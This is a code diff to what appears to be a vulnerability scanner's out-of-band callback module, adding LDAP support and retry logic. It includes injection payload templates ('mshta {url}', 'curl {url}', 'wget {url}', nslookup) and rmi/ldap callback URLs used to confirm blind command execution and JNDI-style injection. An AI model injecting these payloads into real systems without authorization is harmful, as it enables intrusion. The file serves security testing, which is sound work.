@@ -89,10 +89,42 @@ def getrealdnsdata(urlpath):
     return data
 
 
+def generate(urlpath, type="http"):
+    if isinstance(urlpath, str):
+        urlpath = urlpath.encode()
+
+    if type == "dns":
+        hexdata = getrealdnsdata(urlpath)
+        return None, hexdata  # will like None,rvzf74657374.log.evilhex.top
+    elif type == "http":
+        hexdata = get_random_str(4).lower() + binascii.b2a_hex(urlpath).decode()
+        '''
+        return like: http://www.baidu.com?d=aaaasdfasd ,aaaasdfasd
+        '''
+        return "http://{}:{}/?d={}".format(reverse_set.get("reverse_http_ip"),
+                                           reverse_set.get("reverse_http_port"), hexdata), hexdata
+    elif type == "rmi":
+        hexdata = get_random_str(4).lower() + binascii.b2a_hex(urlpath).decode()
+        '''
+        return like:rmi://1.1.1.1:999/test,test
+        '''
+        return "rmi://{}:{}/{}".format(reverse_set.get("reverse_rmi_ip"),
+                                       reverse_set.get("reverse_rmi_port"),
+                                       hexdata), hexdata
+    elif type == "ldap":
+        hexdata = get_random_str(4).lower() + binascii.b2a_hex(urlpath).decode()
+        '''
+       return like:ldap://1.1.1.1:999/test,test
+       '''
+        return "ldap://{}:{}/{}".format(reverse_set.get("reverse_ldap_ip"),
+                                        reverse_set.get("reverse_ldap_port"),
+                                        hexdata),hexdata
+
+
 def generate_reverse_payloads(urlpath, type="http"):
     '''
     urlpath: string or bytes, url's path or others you wanto paste infos,don't contains url args ,it will to longs ,like http://www.test.com/admin/login
-    type : string ,accept http,dns,rmi
+    type : string ,accept http,dns,rmi,ldap
     return ([cmd1,cmd2],payload)
     '''
     # if "?" in urlpath:
@@ -103,8 +135,9 @@ def generate_reverse_payloads(urlpath, type="http"):
 
     payloads = {
         "http": ["mshta {url}", "curl {url}", "wget {url}"],
-        "dns": ["ping -n 2 {domain}", "ping -c 2 {domain}" "nslookup {domain}"],
+        "dns": ["ping -n 2 {domain}", "ping -c 2 {domain}", "nslookup {domain}"],
         "rmi": ["rmi://{}:{}/{}"],
+        "ldap": ["ldap://{}:{}/{}"],
     }
     reverse_payloads = []
     hexdata = ""
@@ -128,7 +161,14 @@ def generate_reverse_payloads(urlpath, type="http"):
                                reverse_set.get("reverse_rmi_port"),
                                hexdata)
             )
-
+    elif type == "ldap":
+        hexdata = get_random_str(4).lower() + binascii.b2a_hex(urlpath).decode()
+        for payload in payloads["ldap"]:
+            reverse_payloads.append(
+                payload.format(reverse_set.get("reverse_ldap_ip"),
+                               reverse_set.get("reverse_ldap_port"),
+                               hexdata)
+            )
     return (reverse_payloads, hexdata)
 
 
@@ -138,22 +178,24 @@ def query_reverse(payload, sleep=True):
     '''
     if sleep:
         time.sleep(int(reverse_set.get("sleep", 5)))
-    try:
-        r = requests.get("http://{}:{}/search?query={}&key={}".format(reverse_set.get("reverse_http_ip"),
-                                                                      reverse_set.get("reverse_http_port"),
-                                                                      payload,
-                                                                      reverse_set.get("secret_key")),
-                         timeout=5)
-        res = r.json()
-        if res.get("total") > 0:
-            return True, res
-        else:
-            return False, res
+    for _ in range(3):
+        try:
+            r = requests.get("http://{}:{}/search?query={}&key={}".format(reverse_set.get("reverse_http_ip"),
+                                                                          reverse_set.get("reverse_http_port"),
+                                                                          payload,
+                                                                          reverse_set.get("secret_key")),
+                             timeout=5)
+            res = r.json()
+            if res.get("total") > 0:
+                return True, res
+            else:
+                return False, res
 
-    except Exception as ex:
-        logger.debug("Get result from reverse http server error:{}".format(
-            ex) + "May be your network can't connect to {}".format(reverse_set.get("reverse_http_ip")))
-        return False, []
+        except Exception as ex:
+            logger.debug("Get result from reverse http server error:{}".format(
+                ex) + "May be your network can't connect to {}".format(reverse_set.get("reverse_http_ip")))
+            continue
+    return False, []
 
 
 def check_reverse():
@@ -173,8 +215,7 @@ def check_reverse():
     run_cmd(cmd)
     res_http = query_reverse(http_random_str)
     res_dns = query_reverse(domain, False)
-    #此处需添加rmi 服务的检测代码，需本地模拟一个rmi的client
-
+    # 此处需添加rmi 服务的检测代码，需本地模拟一个rmi的client
 
     if res_http[0]:
         logger.critical("Client connect http reverse server: Success")
@@ -184,4 +225,3 @@ def check_reverse():
         logger.critical("Client connect dns reverse server: Success")
     else:
         logger.warning("Client disconnect dns reverse server: Fail")
-
